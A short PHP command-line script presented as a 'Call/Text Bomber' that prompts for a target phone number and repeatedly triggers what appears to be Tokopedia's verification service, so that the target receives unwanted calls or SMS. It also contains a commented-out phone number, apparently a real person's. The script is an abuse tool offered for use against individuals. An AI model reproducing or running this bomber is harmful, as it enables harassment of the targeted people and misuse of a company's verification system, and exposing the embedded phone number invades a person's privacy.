<?php
include 'functions.php';

/*
    Tokopedia Client System
    Developed by Handika Pratama
*/

$init = new tokopedia();

//Call/Text Bomber Execution (Limit 100x/Hour)

echo "Target: ";
$target = trim(fgets(STDIN));
echo "2 for call, 1 for Text";
echo "type: ";
$type = trim(fgets(STDIN));
$init->target = "$target";
$init->type = 2;
//$init->target = "+62895371761108";

if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) {
	    $init->Verif($init->target,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->target,$init->type);
}
